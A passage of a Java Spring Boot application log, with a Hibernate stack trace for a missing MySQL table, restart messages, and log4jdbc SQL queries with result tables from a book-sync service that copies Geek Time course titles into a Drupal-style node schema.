	at org.hibernate.event.internal.DefaultMergeEventListener.entityIsDetached(DefaultMergeEventListener.java:306)
	at org.hibernate.event.internal.DefaultMergeEventListener.onMerge(DefaultMergeEventListener.java:172)
	at org.hibernate.event.internal.DefaultMergeEventListener.onMerge(DefaultMergeEventListener.java:70)
	at org.hibernate.internal.SessionImpl$$Lambda$866/1344036981.accept(Unknown Source)
	at org.hibernate.event.service.internal.EventListenerGroupImpl.fireEventOnEachListener(EventListenerGroupImpl.java:102)
	at org.hibernate.internal.SessionImpl.fireMerge(SessionImpl.java:794)
	at org.hibernate.internal.SessionImpl.merge(SessionImpl.java:781)
	at sun.reflect.GeneratedMethodAccessor98.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.springframework.orm.jpa.ExtendedEntityManagerCreator$ExtendedEntityManagerInvocationHandler.invoke(ExtendedEntityManagerCreator.java:366)
	at com.sun.proxy.$Proxy111.merge(Unknown Source)
	at sun.reflect.GeneratedMethodAccessor98.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.springframework.orm.jpa.SharedEntityManagerCreator$SharedEntityManagerInvocationHandler.invoke(SharedEntityManagerCreator.java:314)
	at com.sun.proxy.$Proxy111.merge(Unknown Source)
	at org.springframework.data.jpa.repository.support.SimpleJpaRepository.save(SimpleJpaRepository.java:557)
	at sun.reflect.GeneratedMethodAccessor106.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.springframework.data.repository.core.support.ImplementationInvocationMetadata.invoke(ImplementationInvocationMetadata.java:72)
	at org.springframework.data.repository.core.support.RepositoryComposition$RepositoryFragments.invoke(RepositoryComposition.java:382)
	at org.springframework.data.repository.core.support.RepositoryComposition.invoke(RepositoryComposition.java:205)
	at org.springframework.data.repository.core.support.RepositoryFactorySupport$ImplementationMethodExecutionInterceptor.invoke(RepositoryFactorySupport.java:549)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.doInvoke(QueryExecutorMethodInterceptor.java:155)
	at org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.invoke(QueryExecutorMethodInterceptor.java:130)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor.invoke(DefaultMethodInvokingMethodInterceptor.java:80)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.transaction.interceptor.TransactionInterceptor$$Lambda$843/1075645785.proceedWithInvocation(Unknown Source)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:367)
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:118)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.data.jpa.repository.support.CrudMethodMetadataPostProcessor$CrudMethodMetadataPopulatingMethodInterceptor.invoke(CrudMethodMetadataPostProcessor.java:178)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212)
	at com.sun.proxy.$Proxy136.save(Unknown Source)
	at sun.reflect.GeneratedMethodAccessor104.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:344)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:205)
	at com.sun.proxy.$Proxy88.save(Unknown Source)
	at geek.me.javaapi.service.BookService.createOneFeileiEntity(BookService.java:376)
	at geek.me.javaapi.service.BookService.createRoot(BookService.java:152)
	at geek.me.javaapi.service.BookService.syncBook(BookService.java:111)
	at geek.me.javaapi.service.BookService.transfer(BookService.java:535)
	at geek.me.javaapi.controller.BookController.transfer(BookController.java:47)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190)
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138)
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105)
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878)
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792)
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:626)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1589)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.sql.SQLSyntaxErrorException: Table 'rumen.node__field_fenlei' doesn't exist
	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120)
	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97)
	at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122)
	at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:953)
	at com.mysql.cj.jdbc.ClientPreparedStatement.executeQuery(ClientPreparedStatement.java:1003)
	at net.sf.log4jdbc.sql.jdbcapi.PreparedStatementSpy.executeQuery(PreparedStatementSpy.java:780)
	at com.zaxxer.hikari.pool.ProxyPreparedStatement.executeQuery(ProxyPreparedStatement.java:52)
	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeQuery(HikariProxyPreparedStatement.java)
	at org.hibernate.engine.jdbc.internal.ResultSetReturnImpl.extract(ResultSetReturnImpl.java:57)
	... 132 common frames omitted
2020-11-19 10:53:12.479 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:598 - Closing JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:53:12.481 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:218 - Shutting down ExecutorService 'applicationTaskExecutor'
2020-11-19 10:53:12.481 INFO  com.zaxxer.hikari.HikariDataSource Line:350 - HikariPool-1 - Shutdown initiated...
2020-11-19 10:53:12.486 INFO  com.zaxxer.hikari.HikariDataSource Line:352 - HikariPool-1 - Shutdown completed.
2020-11-19 10:53:19.179 INFO  geek.me.javaapi.JavaApiApplication Line:651 - No active profile set, falling back to default profiles: default
2020-11-19 10:53:19.538 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:127 - Bootstrapping Spring Data JPA repositories in DEFERRED mode.
2020-11-19 10:53:19.619 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:187 - Finished Spring Data repository scanning in 75ms. Found 19 JPA repository interfaces.
2020-11-19 10:53:19.737 INFO  org.springframework.cloud.context.scope.GenericScope Line:295 - BeanFactory id=712cf88e-c083-3907-88de-02f90b8f246d
2020-11-19 10:53:19.998 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:108 - Tomcat initialized with port(s): 8080 (http)
2020-11-19 10:53:20.005 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Initializing ProtocolHandler ["http-nio-8080"]
2020-11-19 10:53:20.005 INFO  org.apache.catalina.core.StandardService Line:173 - Starting service [Tomcat]
2020-11-19 10:53:20.006 INFO  org.apache.catalina.core.StandardEngine Line:173 - Starting Servlet engine: [Apache Tomcat/9.0.37]
2020-11-19 10:53:20.077 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring embedded WebApplicationContext
2020-11-19 10:53:20.078 INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext Line:285 - Root WebApplicationContext: initialization completed in 887 ms
2020-11-19 10:53:20.213 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:181 - Initializing ExecutorService 'applicationTaskExecutor'
2020-11-19 10:53:20.220 INFO  com.zaxxer.hikari.HikariDataSource Line:110 - HikariPool-1 - Starting...
2020-11-19 10:53:20.327 INFO  com.zaxxer.hikari.HikariDataSource Line:123 - HikariPool-1 - Start completed.
2020-11-19 10:53:20.419 INFO  org.hibernate.jpa.internal.util.LogHelper Line:31  - HHH000204: Processing PersistenceUnitInfo [name: default]
2020-11-19 10:53:20.461 INFO  org.hibernate.Version Line:44  - HHH000412: Hibernate ORM core version 5.4.20.Final
2020-11-19 10:53:20.565 INFO  org.hibernate.annotations.common.Version Line:49  - HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2020-11-19 10:53:20.649 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:53:20.654 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:53:20.658 INFO  org.hibernate.dialect.Dialect Line:170 - HHH000400: Using dialect: org.hibernate.dialect.MySQL55Dialect
2020-11-19 10:53:21.254 INFO  org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator Line:52  - HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2020-11-19 10:53:21.260 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:416 - Initialized JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:53:22.087 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:53:22.155 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Starting ProtocolHandler ["http-nio-8080"]
2020-11-19 10:53:22.172 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:220 - Tomcat started on port(s): 8080 (http) with context path ''
2020-11-19 10:53:23.242 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2020-11-19 10:53:23.242 INFO  org.springframework.web.servlet.DispatcherServlet Line:525 - Initializing Servlet 'dispatcherServlet'
2020-11-19 10:53:23.248 INFO  org.springframework.web.servlet.DispatcherServlet Line:547 - Completed initialization in 6 ms
2020-11-19 10:53:23.270 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:53:23.271 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:49  - Triggering deferred initialization of Spring Data repositories…
2020-11-19 10:53:23.819 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:53  - Spring Data repositories initialized!
2020-11-19 10:53:23.824 INFO  geek.me.javaapi.JavaApiApplication Line:61  - Started JavaApiApplication in 7.458 seconds (JVM running for 8.244)
2020-11-19 10:53:46.936 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_, queueentit0_.base_path as base_pat2_18_, queueentit0_.name 
as name3_18_, queueentit0_.todo as todo4_18_ from queue_new queueentit0_ where queueentit0_.todo=1 
 {executed in 5 msec}
2020-11-19 10:53:46.951 INFO  jdbc.resultsettable Line:610 - 
|-----------------|-------------------------------|--------------------|-----|
|item_id          |base_path                      |name                |todo |
|-----------------|-------------------------------|--------------------|-----|
|283828550600385  |00-资源文件/14-极客时间/01-专栏课/051-99/ |87-全栈工程师修炼指南        |1    |
|300655922831157  |00-资源文件/14-极客时间/01-专栏课/051-99/ |52-透视HTTP协议         |1    |
|390535478164697  |00-资源文件/14-极客时间/01-专栏课/051-99/ |51-白话法律42讲          |1    |
|409602706903658  |00-资源文件/14-极客时间/01-专栏课/051-99/ |77-从0打造音视频直播系统      |1    |
|459081746926346  |00-资源文件/14-极客时间/01-专栏课/051-99/ |99-JavaScript核心原理解析 |1    |
|476330106989327  |00-资源文件/14-极客时间/01-专栏课/051-99/ |88-高并发系统设计40问       |1    |
|621195835058382  |00-资源文件/14-极客时间/01-专栏课/051-99/ |97-项目管理实战20讲        |1    |
|626896109933850  |00-资源文件/14-极客时间/01-专栏课/051-99/ |98-设计模式之美           |1    |
|773737007105338  |00-资源文件/14-极客时间/01-专栏课/051-99/ |53-OpenResty从入门到实战  |1    |
|781941951179116  |00-资源文件/14-极客时间/01-专栏课/051-99/ |75-编辑训练营            |1    |
|787964344536295  |00-资源文件/14-极客时间/01-专栏课/051-99/ |80-网络编程实战           |1    |
|789557280998655  |00-资源文件/14-极客时间/01-专栏课/051-99/ |86-即时消息技术剖析与实战      |1    |
|823812106395779  |00-资源文件/14-极客时间/01-专栏课/051-99/ |74-Flutter核心技术与实战   |1    |
|855137735533744  |00-资源文件/14-极客时间/01-专栏课/051-99/ |94-DDD实战课           |1    |
|861073733380654  |00-资源文件/14-极客时间/01-专栏课/051-99/ |90-分布式技术原理与算法解析     |1    |
|876595205877896  |00-资源文件/14-极客时间/01-专栏课/051-99/ |91-说透中台             |1    |
|877479874575179  |00-资源文件/14-极客时间/01-专栏课/051-99/ |83-编译原理之美           |1    |
|936433950782588  |00-资源文件/14-极客时间/01-专栏课/051-99/ |95-苏杰的产品创新课         |1    |
|952316731239648  |00-资源文件/14-极客时间/01-专栏课/051-99/ |92-DevOps实战笔记       |1    |
|954967934009220  |00-资源文件/14-极客时间/01-专栏课/051-99/ |73-黄勇的OKR实战笔记       |1    |
|1004252009859251 |00-资源文件/14-极客时间/01-专栏课/051-99/ |85-研发效率破局之道         |1    |
|1009872364102685 |00-资源文件/14-极客时间/01-专栏课/051-99/ |81-浏览器工作原理与实践       |1    |
|1022101157981678 |00-资源文件/14-极客时间/01-专栏课/051-99/ |79-消息队列高手课          |1    |
|-----------------|-------------------------------|--------------------|-----|

2020-11-19 10:53:46.963 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='283828550600385' 
 {executed in 0 msec}
2020-11-19 10:53:46.964 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|1         |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:53:46.968 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:53:46.969 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|1   |zh-hans  |book |4bb8e624-5f97-4aae-b6e2-3b2e1b596579 |1   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:53:47.001 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.002 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:53:47.007 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:53:47.008 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|1   |1   |1     |1            |1  |0  |0  |0  |0  |0   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:53:47.017 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=1 
 {executed in 3 msec}
2020-11-19 10:53:47.018 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|1         |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:53:47.023 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:53:47.023 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:53:47.031 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:53:47.032 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|1   |1605754243 |1605754243 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |book |1   |1   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:53:47.037 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:53:47.038 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754243 |1605754243 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |1   |1   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:53:47.046 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754427, created=1605754427, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', type='book', 
uid=1, vid=1 where nid=1 
 {executed in 1 msec}
2020-11-19 10:53:47.048 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754427, created=1605754427, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', 
uid=1, vid=1 where nid=1 
 {executed in 1 msec}
2020-11-19 10:53:47.058 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.059 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|1         |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:53:47.066 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.067 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:53:47.071 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.071 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|1         |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:53:47.078 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.079 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:53:47.082 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
